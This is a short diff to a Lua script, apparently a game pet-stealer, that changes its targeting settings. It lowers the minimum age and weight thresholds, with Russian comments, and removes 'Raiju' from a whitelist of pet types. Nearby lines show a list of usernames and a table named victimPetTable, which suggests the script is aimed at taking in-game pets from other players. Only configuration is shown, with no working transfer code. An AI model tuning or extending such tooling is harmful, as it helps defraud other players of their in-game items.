@@ -8,8 +8,8 @@ local USERNAMES = {
     "ZeeS_Farm01"
 }
 
-local MIN_AGE = 40         -- Минимальный возраст для допуска
-local MIN_WEIGHT_KG = 20.0  -- Минимальный вес в килограммах для допуска
+local MIN_AGE = 10         -- Минимальный возраст для допуска
+local MIN_WEIGHT_KG = 5.0  -- Минимальный вес в килограммах для допуска
 
 local PET_WHITELIST = {
     'Raccoon',
@@ -23,7 +23,6 @@ local PET_WHITELIST = {
     'Spinosaurus',
     'Kitsune',
     'Corrupted Kitsune',
-    'Raiju'
 }
 
 local victimPetTable = {}
